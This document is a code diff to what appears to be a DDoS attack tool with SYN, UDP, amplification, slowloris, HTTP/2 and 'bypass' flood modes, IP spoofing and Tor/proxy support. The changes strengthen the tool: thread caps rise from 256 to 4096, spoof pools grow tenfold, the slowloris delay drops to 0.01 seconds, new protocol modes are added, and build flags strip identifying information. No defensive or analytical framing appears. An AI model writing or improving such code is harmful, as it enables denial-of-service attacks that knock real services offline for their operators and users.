@@ -125,7 +125,7 @@ HELP_TEXT = _make_box(
         f"  {B_YELLOW}ATTACK PARAMETERS{DIM}",
         f"    {GREEN}time{DIM} <sec>            Duration  {DIM}(default: 30){DIM}",
         f"    {GREEN}rate{DIM} <pps>            Packets/sec  {DIM}(default: 100000){DIM}",
-        f"    {GREEN}threads{DIM} <n>           Worker count  {DIM}(default: 50, max: 64){DIM}",
+        f"    {GREEN}threads{DIM} <n>           Worker count  {DIM}(default: 1024, max: 4096){DIM}",
         f"    {GREEN}jitter{DIM} <us>           Inter-packet delay  {DIM}(0=no limit){DIM}",
         f"    {GREEN}size{DIM} <bytes>          UDP payload size  {DIM}(max 65000){DIM}",
         f"    {GREEN}mix{DIM} U:S:H:A           Mix ratio  {DIM}(UDP:SYN:HTTP:AMP){DIM}",
@@ -176,7 +176,7 @@ class DDoSConfig:
         self.method = "syn"
         self.time = 30
         self.rate = 100000
-        self.threads = 50
+        self.threads = 1024
         self.mask = False
         self.spoof = False
         self.jitter = 0
@@ -225,8 +225,8 @@ class DDoSConfig:
     def validate(self):
         if not self.target:
             return False, "No target set. Use: target <ip/domain>"
-        if self.threads > 256:
-            self.threads = 256
+        if self.threads > 4096:
+            self.threads = 4096
         if self.rate > 5000000:
             self.rate = 5000000
         return True, "ready"
@@ -237,7 +237,7 @@ class DDoSConfig:
         mode = "http" if self.method == "https" else self.method
         if self.method in ko_modes:
             mode = self.method
-        capped = min(self.threads, 256)
+        capped = min(self.threads, 4096)
         return {
             "target": self.target,
             "port": self.port,
@@ -259,6 +259,7 @@ class DDoSConfig:
             "h2_concurrent_streams": self.h2_streams,
             "dpi_fragment_count": 4,
             "mix_ratio": self.mix if self.method in ("kill", "all", "mix") else "25:25:25:25",
+            "size": self.size,
             "method_list": [
                 'syn', 'udp', 'ack', 'rst', 'icmp', 'dns', 'ntp',
                 'http', 'h2', 'bypass', 'morph'
@@ -335,7 +336,7 @@ def _exec_one(cfg, action, arg):
     elif action == "mode":
         modes = ["syn", "udp", "ack", "rst", "icmp", "dns", "ntp",
                  "http", "https", "h2", "bypass", "morph", "all", "kill",
-                 "land", "slowloris", "amp", "mix"]
+                 "land", "slowloris", "amp", "mix", "quic", "grpc", "ws", "wp"]
         if arg in modes:
             cfg.method = arg
             if arg == "all":
@@ -360,7 +361,7 @@ def _exec_one(cfg, action, arg):
             print(f"  {RED}Usage: rate <pps>{DIM}")
     elif action in ("threads", "w"):
         try:
-            cfg.threads = max(1, min(int(arg.split()[0]), 256))
+            cfg.threads = max(1, min(int(arg.split()[0]), 4096))
             print(f"  {GREEN}Threads set to:{DIM} {cfg.threads}")
             if int(arg.split()[0]) > 256:
                 print(f"  {YELLOW}[!] Capped to 256 max{DIM}")
@@ -536,11 +537,11 @@ def execute_attack(cfg: DDoSConfig):
     _build_engines(not cfg.verbose)
 
     if cfg.spoof:
-        spoof_ips = mask.generate_spoof_pool(1000)
+        spoof_ips = mask.generate_spoof_pool(10000)
         if cfg.verbose:
             print(f"  {DIM}[*] Generated {len(spoof_ips)} spoof IPs{DIM}")
     else:
-        spoof_ips = mask.generate_spoof_pool(1)
+        spoof_ips = mask.generate_spoof_pool(100)
 
     tor_proc = None
     proxy_urls = []
@@ -755,7 +756,7 @@ def execute_attack(cfg: DDoSConfig):
                             if proc.poll() is not None:
                                 break
                             s.send(f"X-Slow-{i}: {'A' * 512}\r\n".encode())
-                            time.sleep(3)
+                            time.sleep(0.01)
                         s.close()
                     except:
                         pass
@@ -799,7 +800,7 @@ def execute_attack(cfg: DDoSConfig):
                             print(f"\n  {YELLOW}[RTT] Server stabilizing ({lat:.0f}ms) — maintaining pressure{DIM}")
                     except Exception:
                         print(f"\n  {YELLOW}[!] Target unreachable — connection refused/timeout{DIM}")
-                    time.sleep(3)
+                    time.sleep(1)
             t_rtt = Thread(target=rtt_monitor, daemon=True)
             t_rtt.start()
 
@@ -999,8 +1000,11 @@ def _build_engines(quiet=False):
             if not quiet:
                 print(f"  {DIM}[*] CC {cf.name}{DIM}")
             r = subprocess.run([
-                'gcc', '-O3', '-march=native', '-flto', '-fPIC',
-                '-I', str(C_DIR / 'include'),
+                'gcc', '-O3', '-march=native', '-flto', '-funroll-loops',
+                '-falign-functions=64', '-fomit-frame-pointer',
+                '-fno-stack-protector', '-fno-ident',
+                '-fvisibility=hidden', '-fdata-sections', '-ffunction-sections',
+                '-fPIC', '-I', str(C_DIR / 'include'),
                 '-c', '-o', str(obj), str(cf),
             ], capture_output=True, text=True)
             if r.returncode != 0 and not quiet:
@@ -1015,6 +1019,7 @@ def _build_engines(quiet=False):
                 print(f"  {CYAN}[*] Linking C engine...{DIM}")
             r = subprocess.run([
                 'gcc', '-O3', '-flto', '-fPIC', '-shared', '-s',
+                '-Wl,-O3', '-Wl,--gc-sections', '-Wl,--as-needed',
                 '-o', str(lib_path)] + [str(o) for o in objs] +
                 ['-lpthread', '-lm'],
                 capture_output=True, text=True)
